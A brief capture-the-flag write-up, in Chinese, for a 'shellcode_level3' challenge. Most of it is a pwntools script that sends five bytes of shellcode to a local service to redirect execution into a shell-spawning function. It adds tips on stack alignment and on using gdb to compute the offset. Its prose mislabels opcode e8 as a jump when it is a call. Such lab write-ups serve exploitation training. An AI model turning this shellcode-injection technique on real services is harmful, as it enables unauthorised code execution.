# shellcode_level3

```py
from pwn import *
p=remote("localhost",65407)
shellcode=b'\xe8\x4d\xd1\xff\xff'
p.sendlineafter("wo?",shellcode)
p.interactive()
```

计算jmp的地址时注意直接跳到givemeshell会因为栈没对齐而执行失败，往下多滑几个地址即可。不知道e8（jmp）后面的地址怎么算的，建议gdb随便输入个数后自行计算（我知道大家来看wp不是来看这个的，但是我真的查了好久都不知道该怎么算，最后还是上gdb一下就出来了）